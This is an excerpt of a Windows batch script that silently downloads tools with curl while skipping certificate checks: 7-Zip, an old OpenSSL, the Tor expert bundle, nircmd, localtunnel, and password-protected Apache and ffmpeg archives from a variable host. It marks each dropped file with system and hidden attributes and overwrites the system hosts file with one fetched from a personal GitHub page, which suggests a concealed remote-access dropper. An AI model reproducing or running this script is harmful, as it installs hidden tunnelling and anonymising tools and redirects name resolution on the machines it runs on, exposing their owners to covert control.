...
attrib -s -h -i "%environment%\7-Zip" && if exist "%environment%\7-Zip\7z.exe" (
  ...
  mkdir "%environment%\7-Zip" && "%environment%\curl.exe" -C - -k -L https://github.com/aaubertsolutions/7za/raw/master/7za.exe -o "%environment%\7-Zip\7z.exe" && attrib +s +h +i "%environment%\7-Zip" 
)

attrib -s -h -i "%environment%\openssl.exe" && if exist "%environment%\openssl.exe" (
    attrib +s +h +i "%environment%\openssl.exe"
) else (
   "%environment%\curl.exe" -C - -k -L https://indy.fulgan.com/SSL/Archive/openssl-1.0.2-i386-win32.zip -o "%temp%\openssl.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\openssl.zip" -o"%environment%" -y && attrib +s +h +i "%environment%\openssl.exe" && attrib +s +h +i "%environment%\libeay32.dll" && attrib +s +h +i "%environment%\ssleay32.dll"
)

attrib -s -h -i "%environment%\tor.exe" && if exist "%environment%\tor.exe" (
    attrib +s +h +i "%environment%\tor.exe"
) else (
   "%environment%\curl.exe" -C - -k -L https://archive.torproject.org/tor-package-archive/torbrowser/12.0.4/tor-expert-bundle-12.0.4-windows-x86_64.tar.gz -o "%temp%\Tor.tar.gz" && "%environment%\7-Zip\7z.exe" e "%temp%\Tor.tar.gz" -so | "%environment%\7-Zip\7z.exe" e -aoa -si -ttar "tor/tor.exe" -o"%environment%" -y && attrib +s +h +i "%environment%\tor.exe" && del "%temp%\Tor.tar.gz"
)
...
"%environment%\curl.exe" -C - -k -L https://archive.org/download/nircmd_201706/nircmd.exe -o "%environment%\nircmd.exe" && attrib +s +h +i "%environment%\nircmd.exe"
)
...
"%environment%\curl.exe" -C - -k %proxy% https://raw.githubusercontent.com/cryptedodissey/cryptedodissey.github.io/main/hosts > "C:\Windows\System32\drivers\etc\hosts"

attrib -s -h -i "%environment%\localtunnel" && if exist "%environment%\localtunnel" (
   attrib +s +h +i "%environment%\localtunnel"
) else (
 "%environment%\curl.exe" -C - -k -L https://github.com/angelobreuer/localtunnel.net/releases/download/1.0.1.0/win-x86.zip > "%temp%/localtunnel.zip" && "%environment%\7-Zip\7z.exe" x "%temp%\localtunnel.zip" -o"%environment%" -y && ren "%environment%\win-x86" "localtunnel" && attrib +s +h +i "%environment%\localtunnel" && del /s /f /q /a "%temp%\localtunnel.zip"
)

tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
if not errorlevel 1 (attrib -s -h -i "%environment%\apache2" && "%environment%\curl.exe" -C - -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache2 -o"%environment%" apache2\conf\*.* -y && attrib +s +h +i "%environment%\apache2" && del /s /f /q /a "%temp%\apache2.7z") else (attrib -s -h -i "%environment%\apache2" && "%environment%\curl.exe" -C - -k %proxy% %host%/Tools/apache2.7z -o "%temp%\apache2.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\apache2.7z" -p7zapache2 -o"%environment%" -y && attrib +s +h +i "%environment%\apache2" && del /s /f /q /a "%temp%\apache2.7z")

 attrib -s -h -i "%environment%\ffmpeg.exe" && if exist "%environment%\ffmpeg.eexe" (
    attrib +s +h +i "%environment%\ffmpeg.exe"
) else (
   "%environment%\curl.exe" -C - -k %proxy% %host%/Tools/ffmpeg.7z -o "%temp%\ffmpeg.7z" && "%environment%\7-Zip\7z.exe" x "%temp%\ffmpeg.7z" -p7zffmpeg -o"%environment%" -y && attrib +s +h +i "%environment%\ffmpeg.exe" && del /s /f /q /a "%temp%\ffmpeg.7z"
)
